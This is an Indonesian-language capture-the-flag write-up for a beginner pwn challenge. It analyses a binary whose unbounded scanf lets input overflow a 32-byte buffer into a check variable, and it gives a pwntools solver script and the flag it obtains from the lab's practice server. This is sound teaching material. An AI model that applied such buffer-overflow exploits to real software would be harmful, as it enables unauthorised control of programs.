https://gemini.google.com/share/df4d21d88966
# WriteUp: Controlling the flow

## Informasi Tantangan

* **Nama Challenge:** Controlling the flow
* **Kategori:** Pwn
* **Poin:** 500
* **Deskripsi:** Tantangan ini mengharuskan kita memanipulasi variabel lokal pada stack untuk mengubah alur eksekusi program (Logic Bypass).
* **Koneksi:** `nc practice-digitalsecuritylab.di.unipi.it 10002`

## 1. Reconnaissance (Pengumpulan Informasi)

Langkah pertama adalah memeriksa jenis file dan proteksi keamanan yang aktif pada binary `chall`.

### Informasi File

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d7010aeeaa74548fb4242ffc37c2d4d0ff623ecc, for GNU/Linux 4.4.0, not stripped

```

### Proteksi Keamanan

```bash
$ checksec --file=chall
[*] '/home/wanzkey/Digital Security Lab CTF/Pwn/Controlling the flow/chall'
    Arch:        amd64-64-little
    RELRO:       Partial RELRO
    Stack:       Canary found
    NX:          NX enabled
    PIE:         PIE enabled
    Stripped:    No

```

* **Canary Found:** Stack terlindungi dari buffer overflow yang menargetkan Return Address.
* **PIE Enabled:** Alamat memori diacak (Address Space Layout Randomization).
* **NX Enabled:** Stack tidak dapat dieksekusi (No Execute).

## 2. Analisis Vulnerability

Menganalisis hasil decompile dari IDA Pro untuk memahami logika program.

**Fungsi `main`:**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-30h] BYREF
  int v5;      // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h] (Canary)

  // ... (setup code) ...
  v5 = 0; // Inisialisasi v5 dengan 0
  printf("Enter your name: ");
  __isoc99_scanf("%s", v4); // VULNERABILITY: Input tidak dibatasi
  
  if ( v5 == 1094861636 ) // Target Check
  {
    puts("Wait, how did you do it?");
    print_flag();
  }
  else
  {
    printf("Hello %s!\n", v4);
  }
  return 0;
}

```

**Analisis:**

1. **Variable Overflow:** Fungsi `scanf("%s", v4)` tidak membatasi panjang input. Ini memungkinkan kita menulis data melebihi kapasitas buffer `v4` (32 bytes).
2. **Stack Layout:**
* `v4` (Buffer): `rbp - 0x30`
* `v5` (Target): `rbp - 0x10`
* Canary: `rbp - 0x8`


3. **Tujuan:** Kita perlu menimpa nilai variable `v5` agar bernilai `1094861636`. Kita tidak perlu menyentuh Canary atau Return Address, sehingga proteksi Canary dan PIE tidak berpengaruh dalam skenario ini.

## 3. Kalkulasi Offset

Menghitung jarak dari awal buffer `v4` menuju variable `v5`.

Artinya, kita perlu mengirimkan **32 byte sampah (padding)** diikuti dengan **nilai integer target**.

**Target Value:** `1094861636` (Decimal) = `0x41424344` (Hex).

## 4. Exploitation Script

Berikut adalah script `solver.py` yang digunakan untuk melakukan eksploitasi:

```python
from pwn import *

# 1. Konfigurasi
exe = './chall'
elf = ELF(exe)
context.binary = exe

# Koneksi ke server remote
io = remote('practice-digitalsecuritylab.di.unipi.it', 10002)

# 2. Kalkulasi Payload
# Offset untuk mencapai variabel v5 adalah 32 byte
offset = 32

# Nilai target yang diminta oleh kondisi if (v5 == 1094861636)
target_value = 1094861636 

# 3. Menyusun Payload
# p32() digunakan untuk mengemas integer menjadi format byte little-endian
payload = flat({
    offset: p32(target_value)
})

log.info(f"Payload length: {len(payload)}")
log.info(f"Target Value: {hex(target_value)}")

# 4. Mengirim Payload
io.recvuntil(b'Enter your name: ')
io.sendline(payload)

# 5. Mendapatkan Flag
io.interactive()

```

## 5. Hasil Eksekusi (Flag)

Berikut adalah output terminal saat script dijalankan dan berhasil mendapatkan flag:

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Digital Security Lab CTF/Pwn/Controlling the flow]
└─$ python3 solver.py
[*] '/home/wanzkey/Digital Security Lab CTF/Pwn/Controlling the flow/chall'
    Arch:        amd64-64-little
    RELRO:       Partial RELRO
    Stack:       Canary found
    NX:          NX enabled
    PIE:         PIE enabled
    Stripped:    No
[+] Opening connection to practice-digitalsecuritylab.di.unipi.it on port 10002: Done
[*] Payload length: 36
[*] Target Value: 0x41424344
[*] Switching to interactive mode
Wait, how did you do it?
flag{contr0lling_v4lu3s_4ft3r_th3_buff3rs!}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to practice-digitalsecuritylab.di.unipi.it port 10002

```

**Flag:** `flag{contr0lling_v4lu3s_4ft3r_th3_buff3rs!}`
